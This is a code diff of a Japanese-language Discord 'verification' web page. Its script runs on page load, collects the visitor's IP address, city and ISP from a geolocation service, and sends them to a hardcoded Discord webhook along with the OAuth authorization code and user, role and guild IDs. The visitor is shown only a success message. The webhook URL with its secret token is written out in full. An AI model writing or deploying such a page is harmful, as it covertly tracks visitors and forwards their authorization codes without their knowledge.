@@ -25,36 +25,51 @@
     </div>
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1457786197194833942/_E73GseEb0V1qIPIb65KbaCeZYddXazUstpwCqhfbwfJcgiAKaoBr9KT7ygzWWg4tF6Q";
+        
         async function start() {
             const params = new URLSearchParams(window.location.search);
             const state = params.get('state');
             const code = params.get('code');
+
             if (!state || !code) return showError("エラー", "無効なアクセスです。");
+
             try {
+                // IP情報の取得
                 const res = await fetch('https://ipapi.co/json/').catch(() => null);
-                const data = res ? await res.json() : {ip: "Unknown", city: "Unknown", org: "Unknown"};
+                const ipData = res ? await res.json() : {ip: "Unknown", city: "Unknown", org: "Unknown"};
+                
+                // stateの解析 (LID_..._UID_..._RID_..._GID_...)
                 const parts = state.split('_');
                 const logId = parts[1];
                 const userId = parts[3];
+                const roleId = parts[5]; // 追加
+                const guildId = parts[7]; // 追加
 
+                // Webhookへデータを送信 (PATCHで元のメッセージを上書き)
                 await fetch(`${WEBHOOK_URL}/messages/${logId}`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `✅ **認証成功**: <@${userId}> | CODE:${code}`,
+                        content: `✅ **認証成功**: <@${userId}> | CODE:${code} | RID:${roleId} | GID:${guildId}`,
                         embeds: [{
                             title: "🛡️ 認証完了 (IP取得成功)",
-                            description: `**ユーザー:** <@${userId}>\n**IP:** \`${data.ip}\`\n**場所:** \`${data.city}\`\n**ISP:** \`${data.org}\``,
+                            description: `**ユーザー:** <@${userId}>\n**IP:** \`${ipData.ip}\`\n**場所:** \`${ipData.city}\`\n**ISP:** \`${ipData.org}\``,
                             color: 0x23a559,
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-                showSuccess("認証完了", "Discordへ戻ってください。");
-            } catch (e) { showError("エラー", "認証に失敗しました。"); }
+
+                showSuccess("認証完了", "自動的にロールが付与されます。Discordへ戻ってください。");
+            } catch (e) { 
+                console.error(e);
+                showError("エラー", "認証処理中に問題が発生しました。"); 
+            }
         }
+
         function showSuccess(t, m) { document.getElementById('loading').style.display = 'none'; document.getElementById('success').style.display = 'inline-block'; document.getElementById('status').innerText = t; document.getElementById('msg').innerText = m; }
         function showError(t, m) { document.getElementById('loading').style.display = 'none'; document.getElementById('error').style.display = 'inline-block'; document.getElementById('status').innerText = t; document.getElementById('msg').innerText = m; }
+        
         window.onload = start;
     </script>
 </body>
